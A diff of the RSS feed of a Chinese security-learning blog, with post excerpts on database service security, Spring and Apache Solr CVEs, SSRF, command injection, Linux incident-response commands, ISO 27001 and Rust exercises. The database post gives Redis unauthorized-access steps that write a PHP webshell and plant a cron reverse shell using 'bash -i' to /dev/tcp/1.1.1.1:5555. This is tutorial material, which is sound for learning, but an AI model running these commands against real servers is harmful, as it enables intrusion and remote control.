@@ -1,7 +1,263 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>ClaudeRead</title><link>https://ClaudeRead.github.io</link><description>言而欲止，止又欲言，胡言乱语，语无伦次，信口雌黄，逐渐癫狂~~~</description><copyright>ClaudeRead</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/252286375?v=4&amp;size=64</url><title>avatar</title><link>https://ClaudeRead.github.io</link></image><lastBuildDate>Thu, 19 Mar 2026 15:22:41 +0000</lastBuildDate><managingEditor>ClaudeRead</managingEditor><ttl>60</ttl><webMaster>ClaudeRead</webMaster><item><title>SSRF漏洞</title><link>https://ClaudeRead.github.io/post/SSRF-lou-dong.html</link><description>### SSRF
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>ClaudeRead</title><link>https://ClaudeRead.github.io</link><description>言而欲止，止又欲言，胡言乱语，语无伦次，信口雌黄，逐渐癫狂~~~</description><copyright>ClaudeRead</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/252286375?v=4&amp;size=64</url><title>avatar</title><link>https://ClaudeRead.github.io</link></image><lastBuildDate>Fri, 20 Mar 2026 02:16:05 +0000</lastBuildDate><managingEditor>ClaudeRead</managingEditor><ttl>60</ttl><webMaster>ClaudeRead</webMaster><item><title>数据库安全</title><link>https://ClaudeRead.github.io/post/shu-ju-ku-an-quan.html</link><description>#### 一、如何引发数据库服务的安全问题
+- 配置不当—未授权访问
+- 自身软件设计上存在缺陷—特定安全漏洞
+- 有些服务使用口令验证进行操作，由于用户疏忽没有及时更改相关口令或设置的口令过于简单—弱口令爆破
 
-&amp;emsp;&amp;emsp;Server-Slde Request Forgery：服务器端请求伪造。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/SSRF-lou-dong.html</guid><pubDate>Thu, 19 Mar 2026 15:14:19 +0000</pubDate></item><item><title>关于ClaudeRead</title><link>https://ClaudeRead.github.io/%E5%85%B3%E4%BA%8E.html</link><description>### 👋 嗨，你好呀！
+#### 二、测试大致思路
+1. 判断服务是否开放
+&amp;emsp;- 端口扫描
+&amp;emsp;- 组合猜测
+&amp;emsp;- 信息来源
+2. 通过上一步进行端口信息判断服务类型
+&amp;emsp;- 数据库
+&amp;emsp;- 文件传输
+&amp;emsp;- 远程控制
+&amp;emsp;- 数据通讯
+3. 判断利用方式
+&amp;emsp;- 特性漏洞
+&amp;emsp;- 未授权访问
+&amp;emsp;- 弱口令爆破
+
+#### 三、常见数据库当中漏洞
+1. MySQL未授权访问CVE-2012-2122
+2. Hadoop未授权访问-内置配合命令执行RCE
+&amp;emsp;- Hadoop端口信息：50010
+3. Redis未授权访问-WEBShell&amp;任务&amp;密匙&amp;RCE等
+&amp;emsp;- 未授权访问的条件：
+&amp;emsp;&amp;emsp;- `bind 127.0.0.1`注释符开启则表示只能本地进行访问，如果被注释则可以通过外网访问
+&amp;emsp;&amp;emsp;- `protected-mode no` 安全模式选项为关闭
+&amp;emsp;&amp;emsp;- 没有设置密码`# requirepass foobared`
+&amp;emsp;- 写WebShell的条件：需要知道web路径以及web目录权限可读写,例如：
+```bash
+config set dir /tmp           # 设置WEB写入目录
+config set dbfilename 1.php   # 设置写入文件名
+set test'&lt;?php phpinfo();?&gt;'  # 设置写入文件内容
+bgsave						  # 保存执行
+save						  # 保存执行
+```
+
+&amp;emsp;&amp;emsp;&amp;emsp;- 写定时任务反弹shell
+&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;- 允许异地登录
+&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;- `protected-mode no` 安全模式选项为关闭
+```nix
+config set dir /var/spool/cron  # 记时目录路径
+set yy '\n\n\n*****bash -i&gt;&amp; /dev/tcp/1.1.1.1/5555 0&gt;&amp;1\n\n\n' # 写入任务代码
+config set dbfilename x	# 写入文件名
+save 	# 保存
+注意：centos会忽略乱码去执行正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/shu-ju-ku-an-quan.html</guid><pubDate>Fri, 20 Mar 2026 01:43:45 +0000</pubDate></item><item><title>Spring组件漏洞：CVE-2018-1273</title><link>https://ClaudeRead.github.io/post/Spring-zu-jian-lou-dong-%EF%BC%9ACVE-2018-1273.html</link><description>危害：
+
+- Spring Data Commons组件中存在远程代码执行漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限
+- Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/Spring-zu-jian-lou-dong-%EF%BC%9ACVE-2018-1273.html</guid><pubDate>Fri, 20 Mar 2026 01:41:03 +0000</pubDate></item><item><title>Rust学习记录(二)</title><link>https://ClaudeRead.github.io/post/Rust-xue-xi-ji-lu-%28-er-%29.html</link><description>Rust基础部分的问题记录
+
+#### 1、变量和可变性
+```rust
+fn main() {  
+    let x: u8 = 5;  
+    // println!('第一种写法：The value of x is: {}', x);  
+    println!('第二种写法：The value of x is: {x}');  
+    x = 6;  
+    println!('The value of x is: {x}');  
+}
+```
+上述代码会报错：
+```powershell
+error[E0384]: cannot assign twice to immutable variable `x`                                                                                
+ --&gt; src\main.rs:6:5
+  |
+2 |     let x: u8 = 5;
+  |         - first assignment to `x`
+...
+6 |     x = 6;
+  |     ^^^^^ cannot assign twice to immutable variable
+  |
+help: consider making this binding mutable
+  |
+2 |     let mut x: u8 = 5;
+  |         +++
+
+For more information about this error, try `rustc --explain E0384`.                                                                                                                                                            
+error: could not compile `variables` (bin 'variables') due to 1 previous error
+```
+报错原因：
+&amp;emsp;&amp;emsp;因为在Rust中，为了确保安全性，变量默认不可变，当变量不可变时，一旦值被绑定一个名称上，用户就不能改变这个值。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/Rust-xue-xi-ji-lu-%28-er-%29.html</guid><pubDate>Fri, 20 Mar 2026 01:41:01 +0000</pubDate></item><item><title>Rust基础部分练习</title><link>https://ClaudeRead.github.io/post/Rust-ji-chu-bu-fen-lian-xi.html</link><description>实验内容：使用Rust语言，做一个学生管理系统的Demo
+
+实验功能：
+&amp;emsp;1. 设置欢迎界面
+&amp;emsp;2. 要求需要对用户输入进行检查
+&amp;emsp;3. 功能模块划分为：
+&amp;emsp;&amp;emsp;a. 第一选项为显示所有学生
+&amp;emsp;&amp;emsp;b. 第二选项为增加学生
+&amp;emsp;&amp;emsp;&amp;emsp;- 内容：姓名、年龄、班级
+&amp;emsp;&amp;emsp;c. 第三选项为删除学生
+&amp;emsp;&amp;emsp;&amp;emsp;- 先显示全部学生
+&amp;emsp;&amp;emsp;&amp;emsp;- 通过指定序号进行删除
+&amp;emsp;&amp;emsp;d. 第四选项为查找指定学生
+&amp;emsp;&amp;emsp;&amp;emsp;- 根据姓名查找学生，显示匹配的学生信息
+&amp;emsp;&amp;emsp;e. 第五选项为退出系统
+
+备注：需要对代码进行添加注释
+
+#### 主界面
+```rust
+let mut students: Vec&lt;(String, u8, String)&gt; = Vec::new();  
+  
+// loop 是一个无限循环，会一直执行直到遇到 break 语句  
+// 这是程序的主循环，用于持续显示菜单和处理用户操作  
+loop {  
+    println!('***学 生 管 理 系 统***');  
+    println!('1.显示所有学生');  
+    println!('2.增加学生');  
+    println!('3.删除学生');  
+    println!('4.查找指定学生');  
+    println!('5.退出');  
+    println!('==========================');  
+    println!('请选择操作 (1-5): ');  
+  
+    // 创建一个空的字符串变量，用于存储用户的输入  
+    // String::new() 创建一个新的空字符串  
+    let mut choice = String::new();  
+      
+    // std::io::stdin() 获取标准输入（键盘输入）  
+    // .read_line(&amp;mut choice) 读取一行输入并存储到 choice 变量中  
+    // &amp;mut choice 表示传递 choice 的可变引用，允许函数修改它  
+    // .expect('输入参数有误，请重新输入') 如果读取失败，显示错误信息并终止程序  
+    std::io::stdin()  
+        .read_line(&amp;mut choice)  
+        .expect('输入参数有误，请重新输入');  
+  
+    // ==================== 输入验证部分 ====================    
+    // choice.trim() 去除字符串两端的空白字符（包括换行符）  
+    // .parse() 尝试将字符串解析为数字  
+    // match 是 Rust 的模式匹配，类似于其他语言的 switch-case    
+    // Ok(num) 表示解析成功，num 是解析出的数字  
+    // Err(_) 表示解析失败，_ 表示忽略错误的具体信息  
+    let choice: u32 = match choice.trim().parse() {  
+        Ok(num) =&gt; num,  // 解析成功，使用解析出的数字  
+        Err(_) =&gt; {  
+            println!('waring: 请输入数字！');  
+            continue;  // 跳过本次循环的剩余部分，直接开始下一次循环  
+        }  
+    };  
+  
+    // ==================== 根据用户选择执行操作 ====================    
+    if choice == 1 {  
+        // 调用显示所有学生的函数  
+        // &amp;mut students 传递 students 的可变引用  
+        // 虽然显示函数不需要修改数据，但为了与其他函数保持一致性  
+        show_all_students(&amp;mut students);  
+    } else if choice == 2 {  
+        // 调用添加学生的函数  
+        add_student(&amp;mut students);  
+    } else if choice == 3 {  
+        // 调用删除学生的函数  
+        delete_student(&amp;mut students);  
+    } else if choice == 4 {  
+        // 调用查找学生的函数  
+        find_student(&amp;mut students);  
+    } else if choice == 5 {  
+        // 用户选择退出  
+        println!('感谢使用学生管理系统，再见！');  
+        break;  // break 语句跳出循环，结束程序  
+    } else {  
+        // 用户输入了无效的选项  
+        println!('无效的选择，请重新输入！');  
+    }  
+    // 循环结束，继续下一次迭代，重新显示菜单  
+}
+```
+
+#### 添加学生功能
+```rust
+fn add_student(students: &amp;mut Vec&lt;(String, u8, String)&gt;) {  
+    // 打印功能标题，\n 表示换行  
+    println!('\n---添加学生---');  
+  
+    // ==================== 输入学生姓名 ====================    
+      
+    // 创建一个空字符串用于存储姓名输入  
+    let mut name = String::new();  
+      
+    // 读取用户输入的一行文本到 name 变量中  
+    std::io::stdin()  
+        .read_line(&amp;mut name)  
+        .expect('无法读取');  
+      
+    // trim() 去除字符串两端的空白字符（包括用户按回车产生的换行符）  
+    // to_string() 将字符串切片转换为 String 类型  
+    // 这样处理后，name 就是一个干净的字符串，没有多余的空白  
+    let name = name.trim().to_string();  
+  
+    // ==================== 输入学生年龄 ====================    
+      
+    // 创建一个空字符串用于存储年龄输入  
+    // 注意：用户输入的是文本，需要转换为数字  
+    let mut age_str = String::new();  
+      
+    // 读取用户输入  
+    std::io::stdin()  
+        .read_line(&amp;mut age_str)  
+        .expect('无法读取输入');  
+      
+    // 尝试将字符串转换为 u8 类型的数字（0-255）  
+    // match 进行模式匹配，判断转换是否成功  
+    let age: u8 = match age_str.trim().parse() {  
+        Ok(num) =&gt; num,  // 转换成功，使用转换后的数字  
+        Err(_) =&gt; {  
+            // 转换失败，说明用户输入的不是数字  
+            println!('年龄必须为数字！添加失败！！！');  
+            return;  // return 提前退出函数，不执行后面的代码  
+        }  
+    };  
+  
+    // ==================== 输入学生班级 ====================    
+    // 创建一个空字符串用于存储班级输入  
+    let mut class_name = String::new();  
+      
+    // 读取用户输入  
+    std::io::stdin()  
+        .read_line(&amp;mut class_name)  
+        .expect('无法读取');  
+      
+    // 去除空白字符并转换为 String 类型  
+    let class_name = class_name.trim().to_string();  
+  
+    // ==================== 将学生信息添加到列表 ====================    
+    // students.push() 向动态数组的末尾添加一个元素  
+    // (name, age, class_name) 创建一个元组，包含三个数据  
+    // 元组的顺序对应：(姓名: String, 年龄: u8, 班级: String)  
+    students.push((name, age, class_name));  
+      
+    // 函数结束，学生信息已成功添加到列表中  
+}
+
+```
+
+#### 删除学生
+```rust
+fn delete_student(students: &amp;mut Vec&lt;(String, u8, String)&gt;) {  
+    println!('\n--- 删除学生 ---');  
+  
+    // ==================== 检查列表是否为空 ====================    
+    
+    // students.is_empty() 检查动态数组是否为空  
+    if students.is_empty() {  
+        println!('暂无学生数据。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/Rust-ji-chu-bu-fen-lian-xi.html</guid><pubDate>Fri, 20 Mar 2026 01:40:58 +0000</pubDate></item><item><title>RCE--远程代码-命令执行漏洞</title><link>https://ClaudeRead.github.io/post/RCE---yuan-cheng-dai-ma---ming-ling-zhi-xing-lou-dong.html</link><description>简介：Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/RCE---yuan-cheng-dai-ma---ming-ling-zhi-xing-lou-dong.html</guid><pubDate>Fri, 20 Mar 2026 01:40:56 +0000</pubDate></item><item><title>Linux应急响应时相关命令</title><link>https://ClaudeRead.github.io/post/Linux-ying-ji-xiang-ying-shi-xiang-guan-ming-ling.html</link><description>### 查看用户
+```Plain Text
+1. 查看用户信息文件
+cat /etc/passwd
+2. 查看影子文件
+cat /etc/shadow
+3. 查看系统是否还存在其他的特权账户，uid为0，默认系统只存在root一个特权账户
+awk -F: '$3==0{print $1}' /etc/passwd
+cat /etc/passwd | grep x:0
+```
+### 查看当前登录用户，以及其登录ip。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/Linux-ying-ji-xiang-ying-shi-xiang-guan-ming-ling.html</guid><pubDate>Fri, 20 Mar 2026 01:40:54 +0000</pubDate></item><item><title>SSRF漏洞</title><link>https://ClaudeRead.github.io/post/SSRF-lou-dong.html</link><description>### SSRF
+
+&amp;emsp;&amp;emsp;Server-Slde Request Forgery：服务器端请求伪造。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/SSRF-lou-dong.html</guid><pubDate>Thu, 19 Mar 2026 15:14:19 +0000</pubDate></item><item><title>关于这段时间AI的使用思考</title><link>https://ClaudeRead.github.io/post/guan-yu-zhe-duan-shi-jian-AI-de-shi-yong-si-kao.html</link><description>&amp;emsp;&amp;emsp;从DeepSeek火爆的时候我开始正式接触AI，了解过一些底层原理，但是也仅限于知道是怎么回事，在往下就没有细究了，更多的是在探索怎么结合AI让我学习工作效率更高。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/guan-yu-zhe-duan-shi-jian-AI-de-shi-yong-si-kao.html</guid><pubDate>Mon, 09 Mar 2026 15:22:56 +0000</pubDate></item><item><title>ISO27001-风险评估工作记录</title><link>https://ClaudeRead.github.io/post/ISO27001--feng-xian-ping-gu-gong-zuo-ji-lu.html</link><description>&amp;emsp;&amp;emsp;综述：在ISO 27001中，核心是风险评估，但是GB/T 20984-2022《信息安全技术 信息安全风险评估方法》也是风险评估。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/ISO27001--feng-xian-ping-gu-gong-zuo-ji-lu.html</guid><pubDate>Wed, 17 Dec 2025 01:21:22 +0000</pubDate></item><item><title>等保相关内容学习记录(一)</title><link>https://ClaudeRead.github.io/post/deng-bao-xiang-guan-nei-rong-xue-xi-ji-lu-%28-yi-%29.html</link><description>#### 一、什么是等保&#13;
+&amp;emsp;&amp;emsp;'等保2.0'，是指以 2019 年发布的新一代网络安全等级保护标准为标志的等级保护制度，以《中华人民共和国网络安全法》为上位法，第二十一条明确'国家实行网络安全等级保护制度'，使等保成为网络运营者的法律义务。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/deng-bao-xiang-guan-nei-rong-xue-xi-ji-lu-%28-yi-%29.html</guid><pubDate>Thu, 24 Jul 2025 09:21:22 +0000</pubDate></item><item><title>CVE-2019-12409</title><link>https://ClaudeRead.github.io/post/CVE-2019-12409.html</link><description>#### 背景、原理&#13;
+&#13;
+&amp;emsp;&amp;emsp;CVE-2019-12409 是 Apache Solr 中的远程代码执行漏洞，影响版本为 Apache Solr 5.0.0 至 8.2.0。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/CVE-2019-12409.html</guid><pubDate>Thu, 03 Apr 2025 07:23:09 +0000</pubDate></item><item><title>关于ClaudeRead</title><link>https://ClaudeRead.github.io/%E5%85%B3%E4%BA%8E.html</link><description>### 👋 嗨，你好呀！
 
 欢迎来到我的小站！这里是我在互联网上的一方小天地 🌿
 ---
